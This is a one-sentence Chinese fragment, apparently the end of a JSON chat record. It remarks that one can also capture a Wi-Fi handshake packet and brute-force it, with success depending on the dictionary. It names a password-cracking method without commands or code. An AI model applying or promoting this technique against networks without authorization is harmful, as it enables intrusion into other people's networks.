当然也可以获取握手包后爆破，但是就看咱们字典厉害不了"}]